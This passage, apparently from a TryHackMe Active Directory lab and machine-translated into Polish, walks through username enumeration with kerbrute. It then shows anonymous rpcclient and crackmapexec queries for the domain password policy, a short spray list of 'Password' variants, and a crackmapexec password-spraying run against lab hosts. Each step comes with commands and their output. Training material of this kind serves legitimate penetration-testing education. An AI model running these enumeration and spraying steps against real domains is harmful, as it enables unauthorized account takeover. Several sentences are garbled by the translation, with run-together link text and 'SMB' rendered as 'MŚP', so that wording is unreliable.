2025/05/16 11:58:16 >  [+] VALID USERNAME:	 nigel.parsons@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 gerald.burgess@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 barbara.jones@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 Administrator@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 jeremy.booth@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 kathryn.williams@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 danny.baker@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 gary.clarke@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 marion.kay@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 daniel.turner@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 debra.yates@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 danielle.lee@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 douglas.roberts@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 danielle.ali@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 jennifer.harding@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 martin.riley@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 jeffrey.thompson@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 asrepuser1@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 krbtgtsvc@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 strate905@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 drgonz0@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 empanadal0v3r@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 strategos@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 rduke@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 DC$@tryhackme.loc
2025/05/16 11:58:16 >  Done! Tested 33 usernames (28 valid) in 0.026 seconds
Jak widać na powyższym wykresie, 28 z 33 użytkowników z naszej listy jest prawidłowych. Możemy wykorzystać te informacje do aktualizacji naszej listy użytkowników.

Jeśli jednak naszym jedynym wyborem jest użycie kerbrute do wyliczenia użytkowników, ponieważ inne narzędzia nie działają, możemy pobraćlista słówpodoba mi się ten(otwiera się w nowej karcie)aby odkryć konta użytkowników. Po znalezieniu prawidłowej listy użytkowników możemy dodać ich do pliku o nazwie users.txt, którego użyjemy podczas ataku polegającego na rozpylaniu haseł.

W trakcie tego zadania testowaliśmy wiele narzędzi, które pomagają nam w enumeracji domen, takich jak zbieranie prawidłowych użytkowników domen. Mając prawidłową listę, jesteśmy gotowi do rozpoczęcia ataku polegającego na rozpylaniu haseł i uzyskania pierwszego zestawu.OGŁOSZENIEreferencje.

Rozpylanie haseł to technika ataku polegająca na testowaniu niewielkiego zestawu popularnych haseł na wielu kontach. W przeciwieństwie do ataków siłowych, rozpylanie haseł zapobiega blokowaniu kont, testując każde konto zaledwie kilkoma próbami, wykorzystując w ten sposób słabe praktyki dotyczące haseł, powszechne w wielu organizacjach. Rozpylanie haseł jest często skuteczne, ponieważ wiele organizacji:

Wymagaj częstej zmiany hasła, co sprawi, że użytkownicy będą wybierać przewidywalne wzorce (na przykład Summer2025!).
Nie egzekwują należycie swoich zasad.
Używaj tych samych haseł na wielu kontach.
Do popularnych list haseł używanych do rozpylania należą:

Hasła sezonowe.
Domyślne hasła używane przez zespoły IT ( Password123).
Hasła wyciekły w wyniku naruszeń bezpieczeństwa danych, takich jak rockyou.txt.
Polityka haseł
Zanim rozpoczniemy atak, konieczne jest zrozumienie polityki haseł naszego celu. Pozwoli nam to uzyskać informacje o minimalnej długości hasła, jego złożoności oraz liczbie nieudanych prób zablokowania konta.

klient rpcc

Możemy użyć rpcclient poprzez sesję zerową, aby zapytać kontroler domeny o zasady dotyczące haseł:

rpcclient -U "" 10.211.11.10 -N

Następnie możemy uruchomić getdompwinfopolecenie:

Przykładowy terminal
rpcclient $> getdompwinfo
min_password_length: 12
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
CrackMapExec

CrackMapExec to znane narzędzie do wykorzystywania usług sieciowych, z którego będziemy korzystać w tym module. Umożliwia ono enumerację, wykonywanie poleceń i ataki post-exploitacyjne w środowiskach Windows. Obsługuje różne protokoły sieciowe, takie jak SMB, LDAP, RDP i SSH. Jeśli dozwolony jest dostęp anonimowy, możemy pobrać politykę haseł bez uwierzytelniania za pomocą następującego polecenia:

Przykładowy terminal
user@tryhackme$ crackmapexec smb 10.211.11.10 --pass-pol
SMB         10.211.11.10    445    DC               [*] Windows Server 2019 Datacenter 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True)
SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
SMB         10.211.11.10    445    DC               Minimum password length: 18
SMB         10.211.11.10    445    DC               Password history length: 21
SMB         10.211.11.10    445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Password Complexity Flags: 000001
SMB         10.211.11.10    445    DC                   Domain Refuse Password Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Store Cleartext: 0
SMB         10.211.11.10    445    DC                   Domain Password Lockout Admins: 0
SMB         10.211.11.10    445    DC                   Domain Password No Clear Change: 0
SMB         10.211.11.10    445    DC                   Domain Password No Anon Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Complex: 1
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Minimum password age: 1 day 4 minutes
SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.211.11.10    445    DC               Locked Account Duration: 30 minutes
SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
SMB         10.211.11.10    445    DC               Forced Log off Time: Not Set
Wykonywanie ataków polegających na rozpylaniu haseł
Zebraliśmy solidną listę użytkowników na podstawie wyliczenia użytkowników w poprzednim zadaniu; teraz musimy utworzyć krótką listę popularnych haseł.
Dzięki wyliczeniu zasad dotyczących haseł zauważyliśmy, że złożoność hasła wynosi 1:

W rpcclient :password_properties: 0x00000001
Z CrackMapExec :Password Complexity Flags: 000001
Oznacza to, że aby utworzyć hasło, muszą być spełnione co najmniej trzy z czterech poniższych warunków:

Wielkie litery
Małe litery
Cyfry
Znaki specjalne
Ponadto hasła nie mogą zawierać nazwy konta użytkownika ani części jego pełnego imienia i nazwiska dłuższej niż dwa kolejne znaki. Link do tego linku:(otwiera się w nowej karcie)aby zrozumieć definicje złożoności haseł firmy Microsoft.

Wyobraźmy sobie, że dzięki informacjom OSINT odkryliśmy, że w tej firmie doszło do naruszenia bezpieczeństwa danych, a niektóre ze znanych haseł były wariantami ciągu „Password”. Możemy utworzyć następującą listę, dbając o przestrzeganie zasad dotyczących haseł:

Password!
Password1
Password1!
P@ssword
Pa55word1
Możemy użyć CrackMapExec do przeprowadzenia ataku polegającego na rozpylaniu haseł na komputer WRK:

Przykładowy terminal
user@tryhackme$ crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Copying default configuration file
SMB         10.211.11.20    445    WRK              [*] Windows 10.0 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Guest:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgt:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\DC$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\WRK$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-]
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [+] tryhackme.loc\*****:******
W [+]ostatnim wierszu naszego wyniku znajduje się informacja, że ​​znaleźliśmy prawidłową parę poświadczeń.

W tej sali skupiliśmy się na różnych rodzajach działań rozpoznawczych i enumeracyjnych, które nie wymagają ważnych uprawnień. Omówiliśmy mapowanie sieci, odkrywanie i enumerację.MŚPakcje,LDAP, RPC i inne. Na koniec omówiliśmy ataki polegające na rozpylaniu haseł i różne narzędzia do przeprowadzania takich ataków.

Active Directory pozostaje złożonym tematem i zachęcamy do odwiedzenia innych sal, aby rozwinąć i udoskonalić swoje umiejętności w zakresie testów penetracyjnych Active Directory. Aby poćwiczyć i zgłębić temat, warto zapoznać się z modułami Breaking Windows i Compromising Active Directory , a także z kolejną salą .
